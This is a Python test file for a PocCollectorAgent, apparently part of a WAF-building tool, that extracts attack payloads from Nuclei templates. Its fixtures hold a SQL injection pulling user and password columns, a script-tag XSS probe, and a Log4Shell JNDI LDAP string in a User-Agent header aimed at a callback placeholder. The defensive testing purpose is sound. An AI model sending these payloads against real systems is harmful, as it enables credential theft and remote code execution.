from __future__ import annotations

from pathlib import Path

from waf_factory.agents import PocCollectorAgent


TEMPLATE = """
id: cve-2026-0002-sqli
info:
  name: CVE-2026-0002 SQLi
  severity: high
  classification:
    cve-id: CVE-2026-0002
http:
  - method: GET
    path:
      - "{{BaseURL}}/item?id=1' UNION SELECT user,password FROM users--"
    raw:
      - |
        GET /item?id=1' UNION SELECT user,password FROM users-- HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - "syntax error"
"""

TEMPLATE_WITH_BODY = """
id: cve-2026-0003-xss
info:
  name: CVE-2026-0003 XSS
  severity: high
  classification:
    cve-id: CVE-2026-0003
http:
  - method: POST
    path:
      - "{{BaseURL}}/search"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: "{{Hostname}}"
    body: "q=<script>alert(1)</script>&lang=en"
    matchers:
      - type: word
        words:
          - "result"
"""

TEMPLATE_WITH_RAW_HEADER_INJECTION = """
id: cve-2021-44228-log4shell
info:
  name: CVE-2021-44228
  severity: critical
  classification:
    cve-id: CVE-2021-44228
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: ${jndi:ldap://{{interactsh-url}}/a}
"""


def test_nuclei_collector_extracts_payloads_for_cve(tmp_path: Path) -> None:
    templates_root = tmp_path / "nuclei-templates"
    templates_root.mkdir(parents=True, exist_ok=True)
    template_file = templates_root / "cves" / "test-cve.yaml"
    template_file.parent.mkdir(parents=True, exist_ok=True)
    template_file.write_text(TEMPLATE, encoding="utf-8")

    collector = PocCollectorAgent(local_root=str(templates_root))
    artifacts, warnings = collector.collect("CVE-2026-0002")

    assert not warnings
    assert artifacts
    assert any("UNION SELECT" in artifact.payload for artifact in artifacts)
    assert all(artifact.source.startswith("nuclei-templates:") for artifact in artifacts)


def test_nuclei_collector_excludes_matcher_noise(tmp_path: Path) -> None:
    templates_root = tmp_path / "nuclei-templates"
    templates_root.mkdir(parents=True, exist_ok=True)
    template_file = templates_root / "cves" / "test-cve.yaml"
    template_file.parent.mkdir(parents=True, exist_ok=True)
    template_file.write_text(TEMPLATE, encoding="utf-8")

    collector = PocCollectorAgent(local_root=str(templates_root))
    artifacts, warnings = collector.collect("CVE-2026-0002")

    assert not warnings
    payloads = [artifact.payload for artifact in artifacts]
    assert payloads
    assert all("syntax error" not in payload.lower() for payload in payloads)


def test_nuclei_collector_keeps_exploit_body_and_sanitizes_placeholders(tmp_path: Path) -> None:
    templates_root = tmp_path / "nuclei-templates"
    templates_root.mkdir(parents=True, exist_ok=True)
    template_file = templates_root / "xss" / "xss-cve.yaml"
    template_file.parent.mkdir(parents=True, exist_ok=True)
    template_file.write_text(TEMPLATE_WITH_BODY, encoding="utf-8")

    collector = PocCollectorAgent(local_root=str(templates_root))
    artifacts, warnings = collector.collect("CVE-2026-0003")

    assert not warnings
    payloads = [artifact.payload for artifact in artifacts]
    assert any("<script>alert(1)</script>" in payload for payload in payloads)
    assert all("{{BaseURL}}" not in payload for payload in payloads)
    assert all("{{Hostname}}" not in payload for payload in payloads)


def test_nuclei_collector_keeps_raw_header_injection_payloads(tmp_path: Path) -> None:
    templates_root = tmp_path / "nuclei-templates"
    templates_root.mkdir(parents=True, exist_ok=True)
    template_file = templates_root / "http" / "cves" / "2021" / "CVE-2021-44228.yaml"
    template_file.parent.mkdir(parents=True, exist_ok=True)
    template_file.write_text(TEMPLATE_WITH_RAW_HEADER_INJECTION, encoding="utf-8")

    collector = PocCollectorAgent(local_root=str(templates_root))
    artifacts, warnings = collector.collect("CVE-2021-44228")

    assert not warnings
    payloads = [artifact.payload for artifact in artifacts]
    assert any("User-Agent:" in payload and "${jndi:ldap://" in payload for payload in payloads)
